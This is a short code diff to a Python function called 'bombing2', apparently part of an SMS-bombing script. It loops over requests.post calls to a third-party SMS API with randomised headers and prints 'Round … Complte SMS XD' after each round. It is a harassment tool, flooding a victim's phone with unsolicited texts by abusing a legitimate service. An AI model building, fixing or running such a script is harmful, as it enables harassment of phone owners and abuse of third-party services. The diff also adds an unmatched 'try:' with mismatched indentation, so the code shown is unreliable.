@@ -176,6 +176,7 @@ def bombing2():
 
 #end heads
 #sent
+try:
      k=0
      while range(yy):
          
@@ -208,7 +209,7 @@ def bombing2():
 
          requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
          print(f"Round {k+1} Complte SMS XD ")
-     return True
+         return True
 
 
 if __name__ == "__main__":
